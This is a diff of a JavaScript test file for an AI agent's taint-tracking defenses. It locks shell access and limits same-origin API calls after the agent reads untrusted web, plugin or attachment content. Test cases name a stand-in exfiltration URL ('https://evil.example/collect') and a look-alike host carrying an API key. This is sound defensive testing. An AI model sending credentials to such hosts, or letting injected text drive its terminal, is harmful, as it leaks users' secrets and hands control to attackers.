@@ -81,6 +81,9 @@ const UNKNOWN    = { name: 'third_party.effect', capability: 'custom', scope: 'e
 A.ok(taint.isUntrustedSource(WEB_READ), 'web results taint');
 A.ok(taint.isUntrustedSource(BROWSER_TXT), 'browser page reads taint (capId web)');
 A.ok(taint.isUntrustedSource(MCP_READ) && taint.isUntrustedSource(MCP_WRITE), 'connector results taint');
+// a plugin tool's result is text the Commander did not write, like a connector's (GHSA-2hpj quick fix)
+A.ok(taint.isUntrustedSource({ name: 'plugin_weather__forecast', capability: 'plugin:weather', scope: 'read', impact: 'external-unknown' }), 'plugin tool results taint');
+A.ok(!taint.allowedWhenTainted({ name: 'plugin_weather__post', capability: 'plugin:weather', scope: 'execute', impact: 'external-unknown' }), 'and a tainted run cannot call a plugin tool (external-unknown stays locked)');
 A.ok(!taint.isUntrustedSource(FS_READ), 'local file reads do NOT taint in v1 (stated boundary)');
 A.ok(taint.isUntrustedSource(FS_READ, { args: { path: '.attachments/poisoned.txt' } }), 'a parked user document taints when read');
 A.ok(taint.isUntrustedSource(FS_READ, { args: { path: 'notes/.attachments\\poisoned.txt' } }), 'attachment provenance works with either path separator');
@@ -113,10 +116,18 @@ A.eq(taint.postTaintBoundary(SHELL, { taintedBy: 'web_fetch', surface: 'interact
   { allow: true, needsConfirmation: false, oneShot: true }, 'even Always collapses to this exact post-taint call');
 A.eq(taint.postTaintBoundary(SHELL, { taintedBy: 'web_fetch', surface: 'interactive', hasPrompt: true, decision: 'deny' }),
   { allow: false, needsConfirmation: false, oneShot: false }, 'denial remains fail-closed');
+// GHSA-2hpj #2: Full Access keeps zero prompts for everything EXCEPT a host process after taint: text the run read must
+// not drive this computer's terminal unasked. A watched run confirms that one call; an unattended one is refused.
 A.eq(taint.postTaintBoundary(SHELL, { taintedBy: 'web_fetch', surface: 'interactive', hasPrompt: true, fullAccess: true }),
-  { allow: true, needsConfirmation: false, oneShot: false }, 'Full Access survives taint without asking — full means zero permission prompts');
+  { allow: false, needsConfirmation: true, oneShot: false }, 'Full Access does not lift the execute lock after taint: a watched run confirms the one shell call');
+A.eq(taint.postTaintBoundary(SHELL, { taintedBy: 'web_fetch', surface: 'interactive', hasPrompt: true, fullAccess: true, decision: 'once' }),
+  { allow: true, needsConfirmation: false, oneShot: true }, 'and that confirmation runs exactly this call');
 A.eq(taint.postTaintBoundary(SHELL, { taintedBy: 'web_fetch', surface: 'autonomous', hasPrompt: false, fullAccess: true }),
-  { allow: true, needsConfirmation: false, oneShot: false }, 'Full Access survives taint on unattended task surfaces too');
+  { allow: false, needsConfirmation: false, oneShot: false }, 'an unattended Full Access run that read outside content is refused the shell');
+A.eq(taint.postTaintBoundary(VERIFY, { taintedBy: 'web_fetch', surface: 'autonomous', hasPrompt: false, fullAccess: true }),
+  { allow: false, needsConfirmation: false, oneShot: false }, 'verify.run (a host process too) is held the same way');
+A.eq(taint.postTaintBoundary(WEB_REQ, { taintedBy: 'web_fetch', surface: 'autonomous', hasPrompt: false, fullAccess: true }),
+  { allow: true, needsConfirmation: false, oneShot: false }, 'Full Access still survives taint without asking for a tool that is not a host process');
 A.eq(taint.postTaintBoundary(FS_WRITE, { taintedBy: 'web_fetch', surface: 'autonomous', hasPrompt: false }),
   { allow: true, needsConfirmation: false, oneShot: false }, 'ordinary jailed file analysis remains usable');
 
@@ -365,16 +376,19 @@ A.eq(taint.postTaintBoundary(FS_WRITE, { taintedBy: 'web_fetch', surface: 'auton
 // ---- SAME-ORIGIN API CONTINUATION (owner decision 2026-10-12, Etsy-factory Publisher report) ----
 // Reading one API's response revoked web_request: one card per call in a watched run ("session" collapsed to once),
 // a refusal in an unattended one — so no GET-then-PUT API job could run hands-off. The continuation lets the run keep
-// calling THAT https origin with keys it already sent there; everything else keeps the lock.
+// calling THAT https origin with keys it already sent there, with the first read's method under its folder and no attached
+// files (GHSA-2hpj #6); everything else keeps the lock.
 {
   const wr = { name: 'web_request', capability: 'web', scope: 'write', impact: 'external-credentialed' };
   const call = (url, extra) => ({ name: 'web_request', args: Object.assign({ url }, extra || {}) });
   const P = 'https://api.printify.com/v1/shops/1/products/5de6593ebff03b5313567d22.json';
   const key = { headers: { Authorization: 'Bearer ${PRINTIFY_API_KEY}' } };
   let s = taint.scopeAfterSource(null, wr, call(P, key), { wasTainted: false, runId: 'r1', responseOrigin: 'https://api.printify.com' });
-  A.eq(JSON.stringify(s), '{"origin":"https://api.printify.com","keys":["PRINTIFY_API_KEY"]}', 'the first API read scopes the run to that origin + key');
-  A.ok(taint.sameOriginContinuation(s, wr, call(P, Object.assign({ method: 'PUT', body: '{}' }, key))), 'a PUT back to the same API with the same key continues without a card');
-  A.ok(taint.sameOriginContinuation(s, wr, call('https://api.printify.com/v1/uploads/images.json', Object.assign({ method: 'POST' }, key))), 'any path on the same origin');
+  A.eq(JSON.stringify(s), '{"origin":"https://api.printify.com","keys":["PRINTIFY_API_KEY"],"method":"GET","prefix":"/v1/shops/1/products/","path":"/v1/shops/1/products/5de6593ebff03b5313567d22.json"}', 'the first API read scopes the run to that origin + key, and to its method, path folder and path (GHSA-2hpj #6, final review #8)');
+  A.ok(taint.sameOriginContinuation(s, wr, call('https://api.printify.com/v1/shops/1/products/another.json', key)), 'a GET under the same folder with the same key continues without a card');
+  // GHSA-2hpj #6: one origin is not one principal, so a write after a read and another folder ask again (test/taint-api-continuation-scope.test.js)
+  A.ok(!taint.sameOriginContinuation(s, wr, call(P, Object.assign({ method: 'PUT', body: '{}' }, key))), 'a PUT after a GET is another method: it needs a fresh confirmation');
+  A.ok(!taint.sameOriginContinuation(s, wr, call('https://api.printify.com/v1/uploads/images.json', Object.assign({ method: 'POST' }, key))), 'another path on the same origin no longer continues');
   A.ok(!taint.sameOriginContinuation(s, wr, call('https://evil.example/collect', key)), 'another host keeps the lock (no exfiltration with the key)');
   A.ok(!taint.sameOriginContinuation(s, wr, call('https://api.printify.com.evil.example/x', key)), 'a look-alike host keeps the lock');
   A.ok(!taint.sameOriginContinuation(s, wr, call('http://api.printify.com/v1/x', key)), 'plain http keeps the lock');
